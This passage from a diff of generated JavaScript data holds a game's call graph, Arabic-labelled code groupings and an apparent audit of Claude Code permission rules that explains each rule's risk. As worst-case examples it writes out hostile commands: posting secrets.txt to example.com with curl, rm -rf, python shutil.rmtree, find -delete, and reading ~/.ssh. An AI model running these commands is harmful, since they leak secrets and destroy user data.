:null,"caps":["SRV","KEY"]},{"id":"route:/turn","name":"/turn","file":"worker.js","kind":"route","start":212,"parent":null,"caps":["SRV","KEY"]},{"id":"route:/stats","name":"/stats","file":"worker.js","kind":"route","start":175,"parent":null,"caps":["SRV","KEY"]},{"id":"route:/hearts","name":"/hearts","file":"worker.js","kind":"route","start":192,"parent":null,"caps":["SRV","KEY"]}],"edges":[{"from":"index.html:ev@905","to":"route:/e","how":"network"},{"from":"top:index.html","to":"index.html:T@278","how":"calls"},{"from":"top:index.html","to":"index.html:has@305","how":"calls"},{"from":"top:index.html","to":"index.html:R@280","how":"calls"},{"from":"top:index.html","to":"index.html:noneLine@686","how":"calls"},{"from":"top:index.html","to":"index.html:has@382","how":"calls"},{"from":"top:index.html","to":"index.html:has@433","how":"calls"},{"from":"top:index.html","to":"index.html:has@489","how":"calls"},{"from":"top:index.html","to":"index.html:has@544","how":"calls"},{"from":"top:index.html","to":"index.html:has@589","how":"calls"},{"from":"top:index.html","to":"index.html:has@652","how":"calls"},{"from":"index.html:bannedHit@703","to":"index.html:norm@693","how":"calls"},{"from":"index.html:newState@712","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:franco@736","to":"index.html:frWord@721","how":"calls"},{"from":"index.html:localParse@750","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:localParse@750","to":"index.html:franco@736","how":"calls"},{"from":"index.html:localParse@750","to":"index.html:norm@693","how":"calls"},{"from":"index.html:parseMulti@751","to":"index.html:franco@736","how":"calls"},{"from":"index.html:parseMulti@751","to":"index.html:norm@693","how":"calls"},{"from":"index.html:parseMulti@751","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:validActions@763","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:finalize@769","to":"index.html:T@278","how":"calls"},{"from":"index.html:apply@779","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:apply@779","to":"index.html:R@280","how":"calls"},{"from":"index.html:apply@779","to":"index.html:T@278","how":"calls"},{"from":"index.html:apply@779","to":"index.html:finalize@769","how":"calls"},{"from":"index.html:patchedCount@796","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:novelCount@801","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:sanitizeActions@812","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:sanitizeActions@812","to":"index.html:validActions@763","how":"calls"},{"from":"index.html:applyNovel@825","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:applyNovel@825","to":"index.html:apply@779","how":"calls"},{"from":"index.html:applyNovel@825","to":"index.html:R@280","how":"calls"},{"from":"index.html:applyNovel@825","to":"index.html:T@278","how":"calls"},{"from":"index.html:applyNovel@825","to":"index.html:finalize@769","how":"calls"},{"from":"index.html:boot@850","to":"index.html:$@851","how":"calls"},{"from":"index.html:boot@850","to":"index.html:trDom@841","how":"calls"},{"from":"index.html:boot@850","to":"index.html:T@278","how":"calls"},{"from":"index.html:boot@850","to":"index.html:dailyBanned@688","how":"calls"},{"from":"index.html:cacheKey@877","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:cacheKey@877","to":"index.html:norm@693","how":"calls"},{"from":"index.html:cacheGet@878","to":"index.html:cacheKey@877","how":"calls"},{"from":"index.html:cacheSet@879","to":"index.html:cacheKey@877","how":"calls"},{"from":"index.html:saveStars@883","to":"index.html:loadStars@882","how":"calls"},{"from":"index.html:ensureRun@909","to":"route:/start","how":"network"},{"from":"index.html:ensureRun@909","to":"index.html:api@898","how":"calls"},{"from":"index.html:ensureRun@909","to":"index.html:getPid@888","how":"calls"},{"from":"index.html:ensureRun@909","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:serverTurn@915","to":"index.html:ensureRun@909","how":"calls"},{"from":"index.html:serverTurn@915","to":"route:/turn","how":"network"},{"from":"index.html:serverTurn@915","to":"index.html:api@898","how":"calls"},{"from":"index.html:serverTurn@915","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:dailyResult@932","to":"index.html:lsGet@867","how":"calls"},{"from":"index.html:challengeUrl@945","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:challengeUrl@945","to":"index.html:b64e@943","how":"calls"},{"from":"index.html:challengeUrl@945","to":"index.html:keyCommand@942","how":"calls"},{"from":"index.html:runStars@947","to":"index.html:patchedCount@796","how":"calls"},{"from":"index.html:runStars@947","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:shareText@950","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:shareText@950","to":"index.html:starStr@948","how":"calls"},{"from":"index.html:shareText@950","to":"index.html:found@946","how":"calls"},{"from":"index.html:shareText@950","to":"index.html:streakNow@1051","how":"calls"},{"from":"index.html:shareText@950","to":"index.html:T@278","how":"calls"},{"from":"index.html:shareText@950","to":"index.html:challengeUrl@945","how":"calls"},{"from":"index.html:drawCard@956","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:drawCard@956","to":"index.html:rrect@955","how":"calls"},{"from":"index.html:drawCard@956","to":"index.html:T@278","how":"calls"},{"from":"index.html:drawCard@956","to":"index.html:keyCommand@942","how":"calls"},{"from":"index.html:drawCard@956","to":"index.html:found@946","how":"calls"},{"from":"index.html:drawCard@956","to":"index.html:siteLabel@949","how":"calls"},{"from":"index.html:shareCard@1000","to":"index.html:drawCard@956","how":"calls"},{"from":"index.html:shareCard@1000","to":"index.html:ev@905","how":"calls"},{"from":"index.html:shareCard@1000","to":"index.html:shareText@950","how":"calls"},{"from":"index.html:shareCard@1000","to":"index.html:toast@1055","how":"calls"},{"from":"index.html:shareCard@1000","to":"index.html:T@278","how":"calls"},{"from":"index.html:waShare@1009","to":"index.html:ev@905","how":"calls"},{"from":"index.html:waShare@1009","to":"index.html:shareText@950","how":"calls"},{"from":"index.html:copyLink@1010","to":"index.html:shareText@950","how":"calls"},{"from":"index.html:done@1011","to":"index.html:T@278","how":"calls"},{"from":"index.html:copyLink@1010","to":"index.html:ev@905","how":"calls"},{"from":"index.html:copyLink@1010","to":"index.html:done@1011","how":"passes"},{"from":"index.html:copyLink@1010","to":"index.html:T@278","how":"calls"},{"from":"index.html:applyChallenge@1016","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:applyChallenge@1016","to":"index.html:b64d@944","how":"calls"},{"from":"index.html:applyChallenge@1016","to":"index.html:newRound@1262","how":"calls"},{"from":"index.html:applyChallenge@1016","to":"index.html:el@934","how":"calls"},{"from":"index.html:applyChallenge@1016","to":"index.html:T@278","how":"calls"},{"from":"index.html:applyChallenge@1016","to":"index.html:ev@905","how":"calls"},{"from":"index.html:boot@850","to":"index.html:lsGet@867","how":"calls"},{"from":"index.html:renderMeters@1052","to":"index.html:$@851","how":"calls"},{"from":"index.html:renderMeters@1052","to":"index.html:streakNow@1051","how":"calls"},{"from":"index.html:toast@1055","to":"index.html:nextToast@1056","how":"calls"},{"from":"index.html:nextToast@1056","to":"index.html:el@934","how":"calls"},{"from":"index.html:burst@1061","to":"index.html:el@934","how":"calls"},{"from":"index.html:tapeSlap@1070","to":"index.html:el@934","how":"calls"},{"from":"index.html:earn@1077","to":"index.html:lsSet@868","how":"calls"},{"from":"index.html:earn@1077","to":"index.html:renderMeters@1052","how":"calls"},{"from":"index.html:earn@1077","to":"index.html:pulse@1053","how":"calls"},{"from":"index.html:earn@1077","to":"index.html:$@851","how":"calls"},{"from":"index.html:earn@1077","to":"index.html:toast@1055","how":"calls"},{"from":"index.html:earn@1077","to":"index.html:T@278","how":"calls"},{"from":"index.html:earn@1077","to":"index.html:beep@1038","how":"calls"},{"from":"index.html:touchDay@1083","to":"index.html:lsSet@868","how":"calls"},{"from":"index.html:touchDay@1083","to":"index.html:renderMeters@1052","how":"calls"},{"from":"index.html:touchDay@1083","to":"index.html:pulse@1053","how":"calls"},{"from":"index.html:touchDay@1083","to":"index.html:$@851","how":"calls"},{"from":"index.html:touchDay@1083","to":"index.html:toast@1055","how":"calls"},{"from":"index.html:touchDay@1083","to":"index.html:T@278","how":"calls"},{"from":"index.html:boot@850","to":"index.html:lsSet@868","how":"calls"},{"from":"index.html:boot@850","to":"index.html:renderMeters@1052","how":"calls"},{"from":"index.html:boot@850","to":"index.html:beep@1038","how":"calls"},{"from":"index.html:unlocked@1092","to":"index.html:loadStars@882","how":"calls"},{"from":"index.html:unlocked@1092","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:renderLevels@1093","to":"index.html:el@934","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:dailyResult@932","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:T@278","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:renderLevels@1093","to":"index.html:newRound@1262","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:loadBest@880","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:loadStars@882","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:unlocked@1092","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:toast@1055","how":"calls"},{"from":"index.html:renderLevels@1093","to":"index.html:beep@1038","how":"calls"},{"from":"index.html:updateHUD@1119","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:updateHUD@1119","to":"index.html:$@851","how":"calls"},{"from":"index.html:updateHUD@1119","to":"index.html:el@934","how":"calls"},{"from":"index.html:updateHUD@1119","to":"index.html:T@278","how":"calls"},{"from":"index.html:updateHUD@1119","to":"index.html:patchedCount@796","how":"calls"},{"from":"index.html:updateHUD@1119","to":"index.html:novelCount@801","how":"calls"},{"from":"index.html:updateHUD@1119","to":"index.html:renderMeters@1052","how":"calls"},{"from":"index.html:renderChips@1145","to":"index.html:$@851","how":"calls"},{"from":"index.html:renderChips@1145","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:renderChips@1145","to":"index.html:el@934","how":"calls"},{"from":"index.html:intro@1155","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:intro@1155","to":"index.html:el@934","how":"calls"},{"from":"index.html:intro@1155","to":"index.html:T@278","how":"calls"},{"from":"index.html:addThinking@1168","to":"index.html:el@934","how":"calls"},{"from":"index.html:addThinking@1168","to":"index.html:T@278","how":"calls"},{"from":"index.html:addThinking@1168","to":"index.html:toBottom@935","how":"calls"},{"from":"index.html:typeInto@1169","to":"index.html:toBottom@935","how":"calls"},{"from":"index.html:addTurn@1176","to":"index.html:el@934","how":"calls"},{"from":"index.html:addTurn@1176","to":"index.html:toBottom@935","how":"calls"},{"from":"index.html:addTurn@1176","to":"index.html:typeInto@1169","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:updateHUD@1119","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:renderChips@1145","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:savePatched@876","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:afterTurn@1186","to":"index.html:tapeSlap@1070","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:T@278","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:foundName@806","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:burst@1061","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:beep@1038","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:buzz@1076","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:earn@1077","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:ev@905","how":"calls"},{"from":"index.html:afterTurn@1186","to":"index.html:showEnd@1202","how":"passes"},{"from":"index.html:showEnd@1202","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:showEnd@1202","to":"index.html:unlocked@1092","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:runStars@947","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:saveStars@883","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:el@934","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:T@278","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:loadBest@880","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:saveBest@881","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:patchedCount@796","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:burst@1061","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:beep@1038","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:buzz@1076","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:toast@1055","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:ev@905","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:foundName@806","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:dailyResult@932","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:lsSet@868","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:starStr@948","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:renderLevels@1093","how":"calls"},{"from":"index.html:btn@1246","to":"index.html:el@934","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:btn@1246","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:found@946","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:shareCard@1000","how":"passes"},{"from":"index.html:showEnd@1202","to":"index.html:waShare@1009","how":"passes"},{"from":"index.html:showEnd@1202","to":"index.html:copyLink@1010","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:newRound@1262","how":"calls"},{"from":"index.html:showEnd@1202","to":"index.html:newRound@1262","how":"passes"},{"from":"index.html:boot@850","to":"index.html:closeEnd@1201","how":"passes"},{"from":"index.html:boot@850","to":"index.html:closeEnd@1201","how":"calls"},{"from":"index.html:newRound@1262","to":"index.html:closeEnd@1201","how":"calls"},{"from":"index.html:newRound@1262","to":"index.html:newState@712","how":"calls"},{"from":"index.html:newRound@1262","to":"index.html:loadPatched@869","how":"calls"},{"from":"index.html:newRound@1262","to":"index.html:renderLevels@1093","how":"calls"},{"from":"index.html:newRound@1262","to":"index.html:renderChips@1145","how":"calls"},{"from":"index.html:newRound@1262","to":"index.html:intro@1155","how":"calls"},{"from":"index.html:newRound@1262","to":"index.html:updateHUD@1119","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:turn@1273","to":"index.html:addThinking@1168","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:bannedHit@703","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:finalize@769","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:addTurn@1176","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:T@278","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:R@280","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:beep@1038","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:afterTurn@1186","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:cacheGet@878","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:sanitizeActions@812","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:setNarr@887","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:serverTurn@915","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:cacheSet@879","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:parseMulti@751","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:apply@779","how":"calls"},{"from":"index.html:turn@1273","to":"index.html:applyNovel@825","how":"calls"},{"from":"index.html:boot@850","to":"index.html:send@1322","how":"calls"},{"from":"index.html:send@1322","to":"index.html:touchDay@1083","how":"calls"},{"from":"index.html:send@1322","to":"index.html:beep@1038","how":"calls"},{"from":"index.html:send@1322","to":"index.html:ev@905","how":"calls"},{"from":"index.html:send@1322","to":"index.html:turn@1273","how":"calls"},{"from":"index.html:boot@850","to":"index.html:LEVELS@283","how":"uses"},{"from":"index.html:boot@850","to":"index.html:el@934","how":"calls"},{"from":"index.html:boot@850","to":"index.html:patchedCount@796","how":"calls"},{"from":"index.html:boot@850","to":"index.html:ev@905","how":"calls"},{"from":"index.html:boot@850","to":"index.html:pulse@1053","how":"calls"},{"from":"index.html:boot@850","to":"index.html:updateHUD@1119","how":"calls"},{"from":"index.html:boot@850","to":"index.html:toBottom@935","how":"calls"},{"from":"index.html:boot@850","to":"index.html:setNarr@887","how":"calls"},{"from":"index.html:boot@850","to":"index.html:applyChallenge@1016","how":"calls"},{"from":"index.html:boot@850","to":"index.html:loadBest@880","how":"calls"},{"from":"index.html:boot@850","to":"index.html:newRound@1262","how":"calls"},{"from":"top:index.html","to":"index.html:boot@850","how":"calls"},{"from":"worker.js:reply@24","to":"worker.js:cors@16","how":"calls"},{"from":"worker.js:incr@59","to":"worker.js:db@47","how":"calls"},{"from":"worker.js:getNum@66","to":"worker.js:db@47","how":"calls"},{"from":"worker.js:decr@70","to":"worker.js:db@47","how":"calls"},{"from":"worker.js:cacheGet@73","to":"worker.js:db@47","how":"calls"},{"from":"worker.js:cachePut@77","to":"worker.js:db@47","how":"calls"},{"from":"worker.js:sweep@80","to":"worker.js:db@47","how":"calls"},{"from":"worker.js:cleanReply@115","to":"worker.js:c@121","how":"calls"},{"from":"worker.js:callOpenAI@128","to":"worker.js:once@134","how":"calls"},{"from":"worker.js:statsPage@155","to":"worker.js:db@47","how":"calls"},{"from":"worker.js:statsPage@155","to":"worker.js:esc@154","how":"calls"},{"from":"route:/stats","to":"worker.js:statsPage@155","how":"calls"},{"from":"worker.js:handle@173","to":"worker.js:reply@24","how":"calls"},{"from":"worker.js:handle@173","to":"worker.js:num@12","how":"calls"},{"from":"worker.js:handle@173","to":"worker.js:day@11","how":"calls"},{"from":"route:/e","to":"worker.js:reply@24","how":"calls"},{"from":"route:/e","to":"worker.js:incr@59","how":"calls"},{"from":"route:/hearts","to":"worker.js:reply@24","how":"calls"},{"from":"route:/start","to":"worker.js:reply@24","how":"calls"},{"from":"route:/hearts","to":"worker.js:getNum@66","how":"calls"},{"from":"route:/hearts","to":"worker.js:incr@59","how":"calls"},{"from":"route:/start","to":"worker.js:incr@59","how":"calls"},{"from":"route:/hearts","to":"worker.js:sign@30","how":"calls"},{"from":"route:/start","to":"worker.js:sign@30","how":"calls"},{"from":"route:/hearts","to":"worker.js:decr@70","how":"calls"},{"from":"route:/start","to":"worker.js:decr@70","how":"calls"},{"from":"route:/hearts","to":"worker.js:sweep@80","how":"calls"},{"from":"route:/start","to":"worker.js:sweep@80","how":"calls"},{"from":"route:/turn","to":"worker.js:reply@24","how":"calls"},{"from":"route:/turn","to":"worker.js:sign@30","how":"calls"},{"from":"route:/turn","to":"worker.js:incr@59","how":"calls"},{"from":"route:/turn","to":"worker.js:norm@35","how":"calls"},{"from":"route:/turn","to":"worker.js:cacheGet@73","how":"calls"},{"from":"route:/turn","to":"worker.js:cleanReply@115","how":"calls"},{"from":"route:/turn","to":"worker.js:callOpenAI@128","how":"calls"},{"from":"route:/turn","to":"worker.js:systemPrompt@86","how":"calls"},{"from":"route:/turn","to":"worker.js:decr@70","how":"calls"},{"from":"route:/turn","to":"worker.js:cachePut@77","how":"calls"},{"from":"top:worker.js","to":"worker.js:cors@16","how":"calls"},{"from":"top:worker.js","to":"worker.js:handle@173","how":"calls"},{"from":"top:worker.js","to":"worker.js:reply@24","how":"calls"}]};
+  var RES = null;
+  var AREAS = [{"id":"a5","name":"banned تحليل","desc":"boot novel، الرئيسي، banned تحليل، a الدور","leaves":[{"id":"l7","name":"boot novel","desc":"5 دالة، أهمها: $()، boot()، updateHUD(). بيحفظ على الجهاز.","members":["index.html:updateHUD@1119","index.html:applyNovel@825","index.html:trDom@841","index.html:boot@850","index.html:$@851"]},{"id":"l14","name":"الرئيسي","desc":"3 دالة، أهمها: T()، R()، has().","members":["index.html:T@278","index.html:R@280","index.html:LEVELS@283","index.html:has@305"]},{"id":"l15","name":"banned تحليل 2","desc":"18 دالة، أهمها: has()، has()، has().","members":["index.html:has@382","index.html:has@433","index.html:has@489","index.html:has@544","index.html:has@589","index.html:has@652","index.html:noneLine@686","index.html:dailyBanned@688","index.html:norm@693","index.html:bannedHit@703","index.html:newState@712","index.html:frWord@721","index.html:franco@736","index.html:localParse@750","index.html:parseMulti@751","index.html:validActions@763","index.html:finalize@769","index.html:apply@779","top:index.html"]},{"id":"l10","name":"a الدور","desc":"2 دالة، أهمها: turn()، send().","members":["index.html:turn@1273","index.html:send@1322"]}],"members":[]},{"id":"a6","name":"D1 التخزين","desc":"worker، D1 التخزين، التعليمات للذكاء الاصطناعي","leaves":[{"id":"l11","name":"worker","desc":"6 دالة، أهمها: reply()، sign()، num(). بيستعمل مفتاحاً سرياً، بيستقبل طلبات.","members":["worker.js:day@11","worker.js:num@12","worker.js:cors@16","worker.js:reply@24","worker.js:sign@30","worker.js:norm@35","top:worker.js","route:/e"]},{"id":"l12","name":"D1 التخزين 2","desc":"7 دالة، أهمها: incr()، db()، decr(). بيستعمل مفتاحاً سرياً، بيكتب على قاعدة بيانات، بيستقبل طلبات.","members":["worker.js:db@47","worker.js:incr@59","worker.js:getNum@66","worker.js:decr@70","worker.js:cacheGet@73","worker.js:cachePut@77","worker.js:sweep@80","route:/start","route:/turn","route:/hearts"]},{"id":"l13","name":"التعليمات للذكاء الاصطناعي","desc":"8 دالة، أهمها: handle()، c()، once(). بيتصل بالإنترنت، بيستعمل مفتاحاً سرياً، بيستعمل ذكاء اصطناعي.","members":["worker.js:systemPrompt@86","worker.js:cleanReply@115","worker.js:c@121","worker.js:callOpenAI@128","worker.js:once@134","worker.js:esc@154","worker.js:statsPage@155","worker.js:handle@173","route:/stats"]}],"members":[]},{"id":"a2","name":"المشاركة","desc":"السارد، المشاركة","leaves":[{"id":"l2","name":"السارد","desc":"6 دالة، أهمها: ev()، setNarr()، api(). بيتصل بالإنترنت، بيحفظ على الجهاز.","members":["index.html:setNarr@887","index.html:getPid@888","index.html:api@898","index.html:ev@905","index.html:ensureRun@909","index.html:serverTurn@915"]},{"id":"l4","name":"المشاركة 2","desc":"16 دالة، أهمها: shareText()، rrect()، drawCard(). بينسخ ويشارك.","members":["index.html:keyCommand@942","index.html:b64e@943","index.html:b64d@944","index.html:challengeUrl@945","index.html:found@946","index.html:runStars@947","index.html:starStr@948","index.html:siteLabel@949","index.html:shareText@950","index.html:rrect@955","index.html:drawCard@956","index.html:shareCard@1000","index.html:waShare@1009","index.html:copyLink@1010","index.html:done@1011","index.html:applyChallenge@1016"]}],"members":[]},{"id":"a3","name":"النافذة","desc":"اليومي، النافذة، النهاية النافذة، التنقل","leaves":[{"id":"l3","name":"اليومي","desc":"3 دالة، أهمها: el()، toBottom()، dailyResult().","members":["index.html:dailyResult@932","index.html:el@934","index.html:toBottom@935"]},{"id":"l8","name":"النافذة 2","desc":"6 دالة، أهمها: afterTurn()، addTurn()، intro().","members":["index.html:renderChips@1145","index.html:intro@1155","index.html:addThinking@1168","index.html:typeInto@1169","index.html:addTurn@1176","index.html:afterTurn@1186"]},{"id":"l9","name":"النهاية النافذة","desc":"4 دالة، أهمها: showEnd()، newRound()، btn().","members":["index.html:closeEnd@1201","index.html:showEnd@1202","index.html:btn@1246","index.html:newRound@1262"]},{"id":"l6","name":"التنقل","desc":"2 دالة، أهمها: renderLevels()، unlocked().","members":["index.html:unlocked@1092","index.html:renderLevels@1093"]}],"members":[]},{"id":"l1","name":"التخزين","desc":"11 دالة، أهمها: lsSet()، lsGet()، loadBest(). بيحفظ على الجهاز.","leaves":[],"members":["index.html:lsGet@867","index.html:lsSet@868","index.html:loadPatched@869","index.html:savePatched@876","index.html:cacheKey@877","index.html:cacheGet@878","index.html:cacheSet@879","index.html:loadBest@880","index.html:saveBest@881","index.html:loadStars@882","index.html:saveStars@883"]},{"id":"l5","name":"lamps streak الصوت","desc":"11 دالة، أهمها: beep()، renderMeters()، toast(). صوت واهتزاز.","leaves":[],"members":["index.html:beep@1038","index.html:streakNow@1051","index.html:renderMeters@1052","index.html:pulse@1053","index.html:toast@1055","index.html:nextToast@1056","index.html:burst@1061","index.html:tapeSlap@1070","index.html:buzz@1076","index.html:earn@1077","index.html:touchDay@1083"]},{"id":"l16","name":"count patched","desc":"4 دالة، أهمها: patchedCount()، sanitizeActions()، novelCount().","leaves":[],"members":["index.html:patchedCount@796","index.html:novelCount@801","index.html:foundName@806","index.html:sanitizeActions@812"]}];
+  var APPR = {"rules":[{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(git push:*)","risk":"red","plain":"أي أمر بيبدأ بـ «git push» بدون سؤال","worst":"رح يرفع تعديلاتك للإنترنت ويستبدل التاريخ الموجود هناك بالقوة","tags":["send"],"cmd":"git push --force -f x"},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(npm:*)","risk":"red","plain":"أي أمر بيبدأ بـ «npm» بدون سؤال","worst":"ينشر حزمة على الإنترنت أو يثبّت حزماً من الإنترنت","tags":["send"],"cmd":"npm publish"},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(python3:*)","risk":"red","plain":"أي أمر بيبدأ بـ «python3» بدون سؤال","worst":"يشغّل أي كود python: ممكن يمسح أو يرسل أي شي","tags":["code","delete"],"cmd":"python3 -c \"import shutil; shutil.rmtree('/x')\""},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(rm:*)","risk":"red","plain":"أي أمر بيبدأ بـ «rm» بدون سؤال","worst":"يمسح أي ملف أو مجلد على جهازك، بدون تراجع","tags":["delete","outside"],"cmd":"rm -rf ~/documents"},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(curl:*)","risk":"red","plain":"أي أمر بيبدأ بـ «curl» بدون سؤال","worst":"رح يرسل بيانات لعنوان على الإنترنت","tags":["send"],"cmd":"curl -X POST -d @secrets.txt https://example.com"},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(cat:*)","risk":"red","plain":"أي أمر بيبدأ بـ «cat» بدون سؤال","worst":"يقدر يقرأ أي ملف على جهازك، حتى مفاتيحك وكلمات سرّك","tags":["secrets"]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(find:*)","risk":"red","plain":"أي أمر بيبدأ بـ «find» بدون سؤال","worst":"مع -delete بيمسح كل ملف بيطابق البحث","tags":["delete"],"cmd":"find . -delete"},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Read(~/.ssh/**)","risk":"red","plain":"قراءة ملفات سرية (~/.ssh/**) بدون سؤال","worst":"يقدر يقرأ مفاتيحك وكلمات سرّك","tags":["secrets"]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"mcp__github","risk":"red","plain":"كل أدوات تطبيق «github» بدون سؤال","worst":"قراءة وكتابة وإرسال وحذف بذاك التطبيق","tags":["send","delete"]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Edit(//**)","risk":"red","plain":"تعديل ملفات (//**) برا المشروع بدون سؤال","worst":"يقدر يعدّل أو يستبدل أي ملف على جهازك","tags":["outside"]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(git add:*)","risk":"yellow","plain":"أي أمر بيبدأ بـ «git add» بدون سؤال","worst":"بيحفظ أو بيرتّب تعديلات محلياً (git add)","tags":[],"cmd":"git add --force -f x"},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(npm run build:*)","risk":"yellow","plain":"أي أمر بيبدأ بـ «npm run build» بدون سؤال","worst":"بيشغّل سكربتاً من مشروعك (npm run)","tags":["code"],"cmd":"npm run build --force -f x"},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Bash(ls:*)","risk":"yellow","plain":"أي أمر بيبدأ بـ «ls» بدون سؤال","worst":"يقدر يبحث ويقرأ بأي ملف على جهازك، بما فيها الأسرار","tags":[]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"Edit","risk":"yellow","plain":"تعديل أو إنشاء ملفات المشروع بدون سؤال","worst":"يقدر يستبدل أي ملف بهالنطاق، والتراجع بيعتمد على نسخة محفوظة","tags":[]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"WebFetch(domain:github.com)","risk":"yellow","plain":"فتح صفحات من github.com بدون سؤال","worst":"ممكن يمرّر معلومات من مشروعك بعنوان الرابط","tags":["send"]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"mcp__slack__list_channels","risk":"yellow","plain":"أداة «list_channels» بتطبيق «slack» بدون سؤال","worst":"قراءة من ذاك التطبيق","tags":[]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"allow","raw":"additionalDirectories: C:/Users/pc/Documents","risk":"yellow","plain":"وصول Claude لمجلد برا المشروع: C:/Users/pc/Documents","worst":"يقدر يقرأ ويعدّل ملفات هالمجلد بدون سؤال","tags":["outside"]},{"source":"local","scopeText":"هالمشروع (عندك بس)","kind":"deny","raw":"Read(.env)","risk":"green","plain":"ممنوع: Read(.env)","worst":"محمي: Claude ما بيقدر يعمله","tags":[]}],"mode":{"source":"local","value":"acceptEdits","risk":"yellow","text":"وضع «قبول التعديلات»: تعديل الملفات بيمر بدون سؤال"},"dirs":[{"source":"local","dir":"C:/Users/pc/Documents"}],"hooks":[],"problems":[],"summary":{"capKeys":["send","code","delete","outside","secrets","modify"],"allowed":17,"denied":1,"byRisk":{"red":10,"yellow":7,"green":0},"capabilities":["يمسح ملفات","يرسل أو ينشر على الإنترنت","يوصل لملفات برا المشروع","يشغّل أي كود","يقرأ أو يغيّر 